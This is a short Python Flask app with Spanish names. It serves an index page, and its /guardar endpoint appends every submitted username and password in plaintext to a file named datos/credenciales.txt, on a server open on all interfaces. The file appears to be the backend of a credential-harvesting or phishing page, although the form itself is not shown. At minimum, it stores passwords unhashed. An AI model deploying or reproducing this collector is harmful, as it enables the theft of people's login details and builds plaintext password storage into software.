from flask import Flask, render_template, request, jsonify
import os

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/guardar", methods=["POST"])
def guardar():
    usuario = request.form.get("username")
    password = request.form.get("password")

    if not usuario or not password:
        return jsonify({"error": "Datos incompletos"}), 400

    os.makedirs("datos", exist_ok=True)

    with open("datos/credenciales.txt", "a", encoding="utf-8") as f:
        f.write(f"Usuario: {usuario} | Password: {password}\n")

    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
